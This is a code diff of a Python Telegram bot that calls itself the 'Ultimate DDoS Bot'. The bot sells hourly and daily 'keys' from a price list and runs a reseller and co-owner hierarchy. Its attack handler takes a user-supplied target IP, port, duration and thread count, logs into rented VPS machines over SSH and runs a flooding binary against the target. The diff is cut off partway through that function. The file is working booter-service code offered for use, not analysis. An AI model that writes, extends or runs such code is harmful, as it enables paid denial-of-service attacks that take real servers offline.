@@ -63,12 +63,9 @@ LOG_DATA = defaultdict(list)
 LINK_FILE = "links.json"
 LINKS = {}
 
-DISPLAY_NAME_FILE = "display_names.json"
-
 # Force Join Configuration
 FORCE_JOIN_ENABLED = False
-FORCE_JOIN_CHANNELS = {}  # Key: group_id, Value: channel_username
-DEFAULT_FORCE_CHANNEL = "@lalanub120"  # Default channel if none set for group
+FORCE_JOIN_CHANNEL = "@lalanub120"  # Change this to your channel
 
 # VPS Configuration
 VPS_FILE = "vps.txt"
@@ -79,28 +76,164 @@ VPS_LIST = []
 # Key Prices
 KEY_PRICES = {
     "1H": 5,
-    
+    "2H": 10,  # Price for 1-hour key
+    "3H": 15,  # Price for 1-hour key
+    "4H": 20,  # Price for 1-hour key
+    "5H": 25,  # Price for 1-hour key
+    "6H": 30,  # Price for 1-hour key
+    "7H": 35,  # Price for 1-hour key
+    "8H": 40,  # Price for 1-hour key
+    "9H": 45,  # Price for 1-hour key
+    "10H": 50, # Price for 1-hour key
+    "1D": 60,  # Price for 1-day key
+    "2D": 100,  # Price for 1-day key
+    "3D": 160, # Price for 1-day key
+    "5D": 250, # Price for 2-day key
+    "7D": 320, # Price for 2-day key
+    "15D": 700, # Price for 2-day key
+    "30D": 1250, # Price for 2-day key
+    "60D": 2000, # Price for 2-day key,
 }
 
 # Special Key Prices
 SPECIAL_KEY_PRICES = {
     "1D": 70,
-    
+    "2D": 130,  # 30 days special key price
+    "3D": 250,  # 30 days special key price
+    "4D": 300,  # 30 days special key price
+    "5D": 400,  # 30 days special key price
+    "6D": 500,  # 30 days special key price
+    "7D": 550,  # 30 days special key price
+    "8D": 600,  # 30 days special key price
+    "9D": 750,  # 30 days special key price
+    "10D": 800,  # 30 days special key price
+    "11D": 850,  # 30 days special key price
+    "12D": 900,  # 30 days special key price
+    "13D": 950,  # 30 days special key price
+    "14D": 1000,  # 30 days special key price
+    "15D": 1050,  # 30 days special key price
+    "30D": 1500,  # 30 days special key price
 }
 
 # Image configuration
 START_IMAGES = [
     {
-        'url': 'https://img.freepik.com/premium-photo/illustration-painting-lover-meadow-looking-sunset-generate-ai_868783-7361.jpg?semt=ais_hybrid&w=740',
+        'url': 'https://www.craiyon.com/image/Mfze8oH8SbO8IDZQZb36Tg',
         'caption': (
-            '🔥 Welcome to the Ultimate Service Bot\n\n'
-            '🌐 Multi VPS Attack Support\n\n'
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
             '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            '💀 Bot hosting available for both GRP and Privt\n\n'
             ' JOIN CHANNEL  @RipServerGroup ''\n\n'
         )
     },
-    
+    {
+        'url': 'https://www.craiyon.com/image/KC4CfJPuQTuKdSdlrkiczg',
+        'caption':(
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
+            ' JOIN CHANNEL  @RipServerGroup \n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/A3ol0NRAQc2N3C62DXcfpA',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup\n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/IErJnUlDTkCvcWBeTZX8qQ',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
+            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/073Vnr7jQpGUkSMr6Rrvjw',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup\n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/XgSNsdopTYGnlDsVC4PnSw',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
+            ' JOIN CHANNEL  @RipServerGroup \n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/JbBsmO9RQcy2CKQiOf_MOw',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup\n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/yF1wqEx7TuuAfoBLK0Zmag',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup\n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/XuS2HNGdTFKqGkpAGzzrqg',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup \n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/iRyN9awaQIeFgjqVVucIlA',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup \n\n'
+        )
+    },
+    {
+        'url': 'https://www.craiyon.com/image/bAhq_xScRm-wk-hD9GzUrw',
+        'caption': (
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL  @RipServerGroup\n\n'
+       )
+    },
+    {
+        'url': 'https://mobilehd.blob.core.windows.net/main/2017/02/girl-sexy-black-swimsuit-look-1080x1920.jpg',
+        'caption':(
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
+            ' JOIN CHANNEL @RipServerGroup \n\n'
+        )
+    },
+    {
+        'url': 'https://s2.best-wallpaper.net/wallpaper/iphone/2007/Beautiful-long-hair-girl-look-sunshine-summer_iphone_640x1136.jpg',
+        'caption':(
+            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
+            '🌐 Multi VPS Attack Coordination\n\n'
+            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
+            ' JOIN CHANNEL @@RipServerGroup \n\n'
+        )
+    },
 ]
 
 # File to store key data
@@ -143,87 +276,57 @@ reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)
 settings_keyboard = [
     ['Keys', 'Add Reseller'],
     ['Remove Reseller', 'Add Coin'],
-    ['Set Cooldown', 'RE Status'],
+    ['Set Cooldown', 'Reset VPS'],
     ['Back to Home']
 ]
 settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)
 
 # Owner Settings menu keyboard with bot management buttons
 owner_settings_keyboard = [
-    ['Promote', '📢 Broadcast'],
-    ['🔗 Manage Links', 'Change Channel'],
-    ['📜 View Logs', 'Change Force Channel'],
+    ['Add Bot', 'Remove Bot'],
+    ['Bot List', 'Start Selected Bot'],
+    ['Stop Selected Bot', 'Promote'],
+    ['🔗 Manage Links', '📢 Broadcast'],
+    ['Change Channel', '📜 View Logs'],
     ['Back to Home']
 ]
 owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)
 
- # Create keyboard for VPS settings
-vps_settings_keyboard = [
-        ['Add VPS', 'Remove VPS'],
-        ['VPS Status', 'Upload Binary'],
-        ['Delete Binary', 'Reset VPS'],
-        ['Select VPS', 'Back to Owner']
-    ]
-vps_settings_markup = ReplyKeyboardMarkup(vps_settings_keyboard, resize_keyboard=True)
-
-bot_settings_keyboard = [
-        ['Add Bot', 'Remove Bot'],
-        ['Start Selected Bot', 'Stop Selected Bot'],
-        ['OpenBot', 'CloseBot'],
-        ['Bot List', 'Back to Owner']
-    ]
-bot_settings_markup = ReplyKeyboardMarkup(bot_settings_keyboard, resize_keyboard=True)
-
-service_menu_keyboard = [
-    ['Generate Key', 'Redeem Key'],
-    ['Rules', '🔑 Special Key'],
-    ['Delete Key', '⏳ Uptime'],
-    ['👥 Check Users', 'Attack'],
-    ['Force On', 'Force Off'],
-    ['Back to Owner']
-]
-service_menu_markup = ReplyKeyboardMarkup(service_menu_keyboard, resize_keyboard=True)
-
 owner_keyboard = [
-    ['/Start', 'Menu'],
-    ['Settings', 'Owner Settings'],
-    ['Service Menu', 'VPS Settings'],
-    ['Bot Settings']
+    ['/Start', 'Attack', 'Redeem Key'],
+    ['Rules', 'Settings', 'Generate Key'],
+    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
+    ['OpenBot', 'CloseBot', '👥 Check Users'],
+    ['⚙️ Owner Settings', 'Menu', 'Force On', 'Force Off']
 ]
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
 co_owner_keyboard = [
-    ['/Start', 'Menu'],
-    ['Settings', 'Function']
+    ['/Start', 'Attack', 'Redeem Key'],
+    ['Rules', 'Delete Key', 'Generate Key'],
+    ['OpenBot', '🔑 Special Key', 'CloseBot'],
+    ['Settings', '⏳ Uptime', 'Menu']
 ]
 co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)
 
 # Menu keyboards
 owner_menu_keyboard = [
     ['Add Group ID', 'Remove Group ID'],
+    ['RE Status', 'VPS Status'],
+    ['Add VPS', 'Remove VPS'],
     ['Add Co-Owner', 'Remove Co-Owner'],
-    ['Set Display Name', 'Set Threads'],
-    ['Set Duration', 'Back to Home']  # Added Delete Binary button
+    ['Set Display Name', 'Upload Binary'],
+    ['Delete Binary', 'Back to Home']  # Added Delete Binary button
 ]
 owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)
 
 co_owner_menu_keyboard = [
     ['Add Group ID', 'Remove Group ID'],
-    ['Add VPS', '⏳ Uptime'],
-    ['Set Display Name', 'Reset VPS'],
-    ['Back to Home']
+    ['RE Status', 'Add VPS'],
+    ['Set Display Name', 'Back to Home' ]
+    
 ]
 co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)
-
-# Add this with other keyboard definitions
-function_menu_keyboard = [
-    ['Attack', 'Generate Key'],
-    ['🔑 Special Key', 'Redeem Key'],
-    ['Delete Key', 'Rules'],
-    ['OpenBot', 'CloseBot'],
-    ['Back to Home']
-]
-function_menu_markup = ReplyKeyboardMarkup(function_menu_keyboard, resize_keyboard=True)
 
 # Conversation States
 GET_DURATION = 1
@@ -259,230 +362,9 @@ GET_LINK_NUMBER = 30
 GET_LINK_URL = 31
 GET_BROADCAST_MESSAGE = 31
 GET_CHANNEL_NAME = 32  # Add this with the other state constants
-GET_FORCE_CHANNEL = 33  # Add this with the other state constants
-SELECT_VPS = 34
 
 
-async def select_vps_start(update: Update, context: CallbackContext):
-    # Only allow owner in private chat
-    if update.effective_chat.type != 'private' or not is_owner(update):
-        await update.message.reply_text("❌ *Only owner can select VPS in private chat!*", parse_mode='Markdown')
-        return ConversationHandler.END
 
-    if not VPS_LIST:
-        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
-        return ConversationHandler.END
-
-    # Create a list of VPS with numbers
-    vps_list = "\n".join(
-        f"{i+1}. IP: `{vps[0]}`" 
-        for i, vps in enumerate(VPS_LIST)
-    )
-    await update.message.reply_text(
-        f"⚠️ Select VPS for attack (comma separated numbers, e.g. 1,2,3):\n\n{vps_list}\n\n"
-        f"Max {len(VPS_LIST)} VPS can be selected.",
-        parse_mode='Markdown'
-    )
-    return SELECT_VPS
-
-async def select_vps_input(update: Update, context: CallbackContext):
-    try:
-        selected_numbers = [int(num.strip()) for num in update.message.text.split(',')]
-        selected_vps = []
-        
-        for num in selected_numbers:
-            if 1 <= num <= len(VPS_LIST):
-                selected_vps.append(VPS_LIST[num-1][0])  # Store just the IP
-            else:
-                raise ValueError("Invalid VPS number")
-                
-        if not selected_vps:
-            raise ValueError("No valid VPS selected")
-            
-        context.user_data['selected_vps'] = selected_vps
-        await update.message.reply_text(
-            f"✅ Selected VPS: {', '.join(selected_vps)}\n\n"
-            f"Now use the Attack button to launch attacks on these VPS.",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-        
-    except ValueError as e:
-        await update.message.reply_text(
-            f"❌ Invalid selection: {str(e)}\n\n"
-            f"Please enter comma separated numbers (e.g. 1,2,3)",
-            parse_mode='Markdown'
-        )
-        return SELECT_VPS
-
-
-async def function_menu(update: Update, context: CallbackContext):
-    if not is_co_owner(update):
-        await update.message.reply_text("❌ *Only co-owners can access this menu!*", parse_mode='Markdown')
-        return
-    
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-    
-    await update.message.reply_text(
-        f"⚙️ *Co-Owner Function Menu*\n\n"
-        f"Select an option below:\n\n"
-        f"👑 *Bot Owner:* {current_display_name}",
-        parse_mode='Markdown',
-        reply_markup=function_menu_markup
-    )
-
-
-async def service_menu(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ Only owner can access service menu!", parse_mode='Markdown')
-        return
-    
-    await update.message.reply_text(
-        "🔧 *Service Menu* - Quick access to service commands:",
-        parse_mode='Markdown',
-        reply_markup=service_menu_markup
-    )
-
-
-async def vps_settings(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ Only owner can access VPS settings!", parse_mode='Markdown')
-        return
-    
-    await update.message.reply_text(
-        "⚙️ *VPS Settings Menu*",
-        parse_mode='Markdown',
-        reply_markup=vps_settings_markup
-    )
-
-async def bot_settings(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ Only owner can access bot settings!", parse_mode='Markdown')
-        return
-    
-    # Create keyboard for bot settings
-    
-    await update.message.reply_text(
-        "🤖 *Bot Settings Menu*",
-        parse_mode='Markdown',
-        reply_markup=bot_settings_markup
-    )
-
-async def back_to_owner(update: Update, context: CallbackContext):
-    await update.message.reply_text(
-        "🏠 *Returned to owner menu*",
-        parse_mode='Markdown',
-        reply_markup=owner_markup
-    )
-
-async def change_force_channel_start(update: Update, context: CallbackContext):
-    """Start the process to change the force join channel"""
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can change force join channel!", parse_mode='Markdown')
-        return ConversationHandler.END
-    
-    await update.message.reply_text(
-        "⚠️ First, enter the group ID you want to set the force channel for (or 'default' for default channel):",
-        parse_mode='Markdown'
-    )
-    return GET_GROUP_FOR_DISPLAY_NAME
-
-async def get_group_for_force_channel(update: Update, context: CallbackContext):
-    """Get the group ID to set force channel for"""
-    group_input = update.message.text.strip()
-    
-    if group_input.lower() == 'default':
-        context.user_data['force_channel_group'] = 'default'
-    else:
-        try:
-            group_id = int(group_input)
-            context.user_data['force_channel_group'] = group_id
-        except ValueError:
-            await update.message.reply_text("❌ Invalid group ID! Please enter a numeric ID or 'default'", parse_mode='Markdown')
-            return ConversationHandler.END
-    
-    await update.message.reply_text(
-        "⚠️ Now enter the new channel username (e.g., @newchannel):",
-        parse_mode='Markdown'
-    )
-    return GET_FORCE_CHANNEL
-
-async def change_force_channel_input(update: Update, context: CallbackContext):
-    """Update the force join channel"""
-    new_channel = update.message.text.strip()
-    group_id = context.user_data.get('force_channel_group', 'default')
-    
-    # Basic validation
-    if not new_channel.startswith('@'):
-        await update.message.reply_text("❌ Channel must start with @", parse_mode='Markdown')
-        return ConversationHandler.END
-    
-    if group_id == 'default':
-        DEFAULT_FORCE_CHANNEL = new_channel
-    else:
-        FORCE_JOIN_CHANNELS[group_id] = new_channel
-    
-    await update.message.reply_text(
-        f"✅ Force join channel updated to: {new_channel} for {'default' if group_id == 'default' else f'group {group_id}'}",
-        parse_mode='Markdown'
-    )
-    return ConversationHandler.END
-
-
-async def check_channel_membership(user_id: int, context: CallbackContext, group_id=None) -> bool:
-    """Check if a user is a member of the specified channel with robust error handling."""
-    if not isinstance(user_id, int) or user_id <= 0:
-        logging.error(f"Invalid user_id {user_id} when checking channel membership")
-        return False
-    
-    # Get the appropriate channel for this group
-    channel = FORCE_JOIN_CHANNELS.get(group_id, DEFAULT_FORCE_CHANNEL)
-    
-    # Convert channel to string if it's not already
-    channel = str(channel)
-    
-    # If we got a numeric ID (like -100123456789), convert to string
-    if isinstance(channel, (int, float)):
-        channel = str(int(channel))
-    
-    if not (channel.startswith('@') or channel.startswith('-100')):
-        logging.error(f"Invalid channel format: {channel}")
-        return False
-
-    try:
-        # First verify the user exists
-        try:
-            user = await context.bot.get_chat(user_id)
-            if not user:
-                logging.error(f"User {user_id} not found")
-                return False
-        except Exception as e:
-            logging.error(f"Error verifying user {user_id}: {str(e)}")
-            return False
-
-        # Now check channel membership
-        try:
-            chat_member = await context.bot.get_chat_member(
-                chat_id=channel,
-                user_id=user_id
-            )
-            return chat_member.status not in ['left', 'kicked']
-        except telegram.error.BadRequest as e:
-            if "user not found" in str(e).lower():
-                logging.error(f"User {user_id} not found when checking channel membership")
-            elif "chat not found" in str(e).lower():
-                logging.error(f"Channel {channel} not found")
-            else:
-                logging.error(f"BadRequest when checking channel membership: {e}")
-            return False
-        except Exception as e:
-            logging.error(f"Unexpected error checking channel membership: {e}")
-            return False
-
-    except Exception as e:
-        logging.error(f"General error in check_channel_membership: {e}")
-        return False
-    
 def log_button_click(user_id: int, username: str, button_name: str, chat_type: str, group_id: int = None):
     """Log button clicks to a JSON file"""
     log_entry = {
@@ -536,11 +418,18 @@ async def view_logs(update: Update, context: CallbackContext):
         await update.message.reply_text("Error loading logs.", parse_mode='Markdown')
 
 async def force_join_on(update: Update, context: CallbackContext):
+    """Enable force join requirement"""
+    if not (is_owner(update) or is_co_owner(update)):
+        await update.message.reply_text("❌ Only owner or co-owners can enable force join!", parse_mode='Markdown')
+        return
+    
     global FORCE_JOIN_ENABLED
     FORCE_JOIN_ENABLED = True
-    channel = FORCE_JOIN_CHANNELS.get(update.effective_chat.id, DEFAULT_FORCE_CHANNEL)
+    
     await update.message.reply_text(
-        f"✅ *Force Join enabled! Users must join {channel} before attacking.*",
+        f"✅ Force Join enabled!\n\n"
+        f"Users must join {FORCE_JOIN_CHANNEL} before attacking.\n"
+        f"Key holders can still attack without joining.",
         parse_mode='Markdown'
     )
 
@@ -566,18 +455,9 @@ async def check_channel_membership(user_id: int, context: CallbackContext, chann
         logging.error(f"Invalid user_id {user_id} when checking channel membership")
         return False
     
-    # Convert channel to string if it's not already
-    channel = str(channel)
-    
-    # If we got a numeric ID (like -100123456789), ensure it's a string
-    if not (channel.startswith('@') or channel.startswith('-100')):
-        # If it's a plain number, convert to -100 format
-        try:
-            channel_id = int(channel)
-            channel = f"-100{abs(channel_id)}"
-        except ValueError:
-            logging.error(f"Invalid channel format: {channel}")
-            return False
+    if not channel.startswith('@') and not channel.startswith('-100'):
+        logging.error(f"Invalid channel format: {channel}")
+        return False
 
     try:
         # First verify the user exists
@@ -612,6 +492,8 @@ async def check_channel_membership(user_id: int, context: CallbackContext, chann
     except Exception as e:
         logging.error(f"General error in check_channel_membership: {e}")
         return False
+
+
 
 
 
@@ -1550,7 +1432,7 @@ async def open_bot(update: Update, context: CallbackContext):
     bot_open = True
     await update.message.reply_text(
         "✅ *Bot opened! Users can now attack for 120 seconds without keys.*\n"
-        "⚠️ *Note:* This is temporary access only - users still need to join the channel if force join is enabled.",
+        f"🔑 *For 200 seconds attacks, keys are still required. Buy from *",
         parse_mode='Markdown'
     )
 
@@ -1562,8 +1444,7 @@ async def close_bot(update: Update, context: CallbackContext):
     global bot_open
     bot_open = False
     await update.message.reply_text(
-        "✅ *Bot closed! Users now need keys for all attacks.*\n"
-        "⚠️ *Note:* Channel members can still attack if force join is enabled.",
+        "✅ *Bot closed! Users now need keys for all attacks.*\n",
         parse_mode='Markdown'
     )
 
@@ -1832,53 +1713,30 @@ async def attack_start(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Get the force channel for this group
-    channel = FORCE_JOIN_CHANNELS.get(chat.id, DEFAULT_FORCE_CHANNEL) if chat.type in ['group', 'supergroup'] else DEFAULT_FORCE_CHANNEL
-    
     # Check if user has a valid key
     user_has_key = user_id in redeemed_users and (
         (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id]['expiration_time'] > time.time()) or
         (isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time())
     )
     
-    # Check access conditions - BOT OPEN CHECK SHOULD COME FIRST
+    # Check if bot is open (no key needed)
     user_has_access = False
-    
-    # 1. If bot is open, allow access for 120 seconds
     if bot_open:
         user_has_access = True
-        max_allowed_duration = 120  # 2 minutes when bot is open
-        max_allowed_threads = 1000
-    # 2. If user has a valid key, allow access
     elif user_has_key:
         user_has_access = True
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            max_allowed_duration = SPECIAL_MAX_DURATION
-            max_allowed_threads = SPECIAL_MAX_THREADS
-        else:
-            max_allowed_duration = max_duration
-            max_allowed_threads = MAX_THREADS
-    # 3. If force join is enabled, check channel membership
     elif FORCE_JOIN_ENABLED:
-        try:
-            is_member = await check_channel_membership(user_id, context, channel)
-            if is_member:
-                user_has_access = True
-                max_allowed_duration = 120  # 2 minutes for channel members
-                max_allowed_threads = 1000
-        except Exception as e:
-            logging.error(f"Error checking channel membership: {e}")
+        # Only check channel membership if force join is enabled
+        is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+        if is_member:
+            user_has_access = True
 
     if user_has_access:
-        context.user_data['max_allowed_duration'] = max_allowed_duration
-        context.user_data['max_allowed_threads'] = max_allowed_threads
-        
         current_display_name = get_display_name(update.effective_chat.id)
         
         await update.message.reply_text(
             "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
-            f"ℹ️ *Max duration: {max_allowed_duration} sec*\n"
-            f"ℹ️ *Max threads: {max_allowed_threads}*\n\n"
+            f"ℹ️ *Max duration: {max_duration} sec for channel members, {SPECIAL_MAX_DURATION} sec for key holders.*\n\n"
             f"🔑 *Buy keys from {current_display_name} for extended features*",
             parse_mode='Markdown'
         )
@@ -1888,7 +1746,7 @@ async def attack_start(update: Update, context: CallbackContext):
         
         if FORCE_JOIN_ENABLED:
             await update.message.reply_text(
-                f"❌ *You must join {channel} to attack!*\n\n"
+                f"❌ *You must join {FORCE_JOIN_CHANNEL} to attack!*\n\n"
                 f"🔑 *Or buy a key from {current_display_name} for uninterrupted access*",
                 parse_mode='Markdown'
             )
@@ -1902,9 +1760,6 @@ async def attack_start(update: Update, context: CallbackContext):
 
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
-    
-    # Get user_id from the update
-    user_id = update.effective_user.id
 
     args = update.message.text.split()
     if len(args) != 4:
@@ -1918,18 +1773,34 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    ip, port, duration_str, threads_str = args
-    
-    try:
-        duration = int(duration_str)
-        threads = int(threads_str)
-    except ValueError:
-        await update.message.reply_text("❌ *Invalid duration or threads! Please enter numbers.*", parse_mode='Markdown')
-        return ConversationHandler.END
+    ip, port, duration, threads = args
+    duration = int(duration)
+    threads = int(threads)
 
-    # Get max allowed values from context
-    max_allowed_duration = context.user_data.get('max_allowed_duration', 120)
-    max_allowed_threads = context.user_data.get('max_allowed_threads', 1000)
+    user_id = update.effective_user.id
+    
+    # Check user's permissions
+    is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+    is_special = False
+    
+    if user_id in redeemed_users:
+        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
+            is_special = True
+            max_allowed_duration = SPECIAL_MAX_DURATION
+            max_allowed_threads = SPECIAL_MAX_THREADS
+        elif isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time():
+            max_allowed_duration = max_duration  # Regular key holders get standard limits
+            max_allowed_threads = MAX_THREADS
+    elif is_member:
+        # Channel members get basic access
+        max_allowed_duration = 120  # 2 minutes for channel members
+        max_allowed_threads = 1000
+    else:
+        await update.message.reply_text(
+            "❌ *Access denied! Join the channel or get a key.*",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
 
     if duration > max_allowed_duration:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -1951,148 +1822,109 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Check if user has special key privileges
-    is_special = False
-    if user_id in redeemed_users:
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            is_special = True
-
-    # Get selected VPS or use random if none selected
-    selected_vps_ips = context.user_data.get('selected_vps', [random.choice([vps[0] for vps in VPS_LIST])])
-    
-    # Clear selection after use
-    if 'selected_vps' in context.user_data:
-        del context.user_data['selected_vps']
-    
+    # Rest of the attack logic remains the same...
     last_attack_time = time.time()
     
-    # Store all attack IDs
-    attack_ids = []
-    for vps_ip in selected_vps_ips:
-        attack_id = f"{ip}:{port}-{time.time()}-{vps_ip}"
-        running_attacks[attack_id] = {
-            'user_id': user_id,
-            'start_time': time.time(),
-            'duration': duration,
-            'is_special': is_special,
-            'vps_ip': vps_ip
-        }
-        attack_ids.append(attack_id)
+    # Select a random available VPS
+    selected_vps_ip = random.choice([vps[0] for vps in VPS_LIST]) if VPS_LIST else "localhost"
+    
+    attack_id = f"{ip}:{port}-{time.time()}"
+    running_attacks[attack_id] = {
+        'user_id': user_id,
+        'start_time': time.time(),
+        'duration': duration,
+        'is_special': is_special,
+        'vps_ip': selected_vps_ip
+    }
 
     attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
     
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
-    # Send single attack start message showing all VPS
-    attack_msg = await update.message.reply_text(
+    await update.message.reply_text(
         f"{attack_type}\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
         f"🧵 *Threads*: {threads}\n"
-        f"🌐 *VPS Used*: {', '.join(selected_vps_ips)}\n"
+        f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *Attack launched successfully on {len(selected_vps_ips)} VPS!*",
+        f"🔥 *Attack launched successfully!*",
         parse_mode='Markdown'
     )
 
-    # Store message ID for later editing
-    context.user_data['attack_msg_id'] = attack_msg.message_id
+    # Rest of the attack execution code...
 
-    # Launch attacks on all selected VPS - pass context as argument
-    for attack_id in attack_ids:
-        vps_ip = attack_id.split('-')[-1]
-        asyncio.create_task(run_attack(ip, port, duration, threads, vps_ip, attack_id, update, context))
+    async def run_attack():
+        try:
+            # Find the selected VPS details
+            selected_vps = None
+            for vps in VPS_LIST:
+                if vps[0] == selected_vps_ip:
+                    selected_vps = vps
+                    break
+            
+            if selected_vps:
+                try:
+                    # Execute attack on remote VPS using bgmi binary
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(selected_vps[0], username=selected_vps[1], password=selected_vps[2], timeout=10)
+                    
+                    command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
+                    stdin, stdout, stderr = ssh.exec_command(command)
+                    
+                    # Wait for command to complete or timeout
+                    start_time = time.time()
+                    while time.time() - start_time < duration + 10:  # Add buffer time
+                        if stdout.channel.exit_status_ready():
+                            break
+                        await asyncio.sleep(1)
+                    
+                    ssh.close()
+                except Exception as e:
+                    logging.error(f"Error executing attack on VPS {selected_vps[0]}: {str(e)}")
+                    raise
+            else:
+                # Fallback to local execution if no VPS
+                process = await asyncio.create_subprocess_shell(
+                    f"{BINARY_PATH} {ip} {port} {duration} {threads}",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                await process.communicate()
 
-    return ConversationHandler.END
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
 
-async def run_attack(ip, port, duration, threads, vps_ip, attack_id, update: Update, context: CallbackContext):
-    try:
-        # Find the selected VPS details
-        selected_vps = None
-        for vps in VPS_LIST:
-            if vps[0] == vps_ip:
-                selected_vps = vps
-                break
-        
-        if selected_vps:
-            try:
-                # Execute attack on remote VPS using bgmi binary
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(selected_vps[0], username=selected_vps[1], password=selected_vps[2], timeout=10)
-                
-                command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
-                stdin, stdout, stderr = ssh.exec_command(command)
-                
-                # Wait for command to complete or timeout
-                start_time = time.time()
-                while time.time() - start_time < duration + 10:  # Add buffer time
-                    if stdout.channel.exit_status_ready():
-                        break
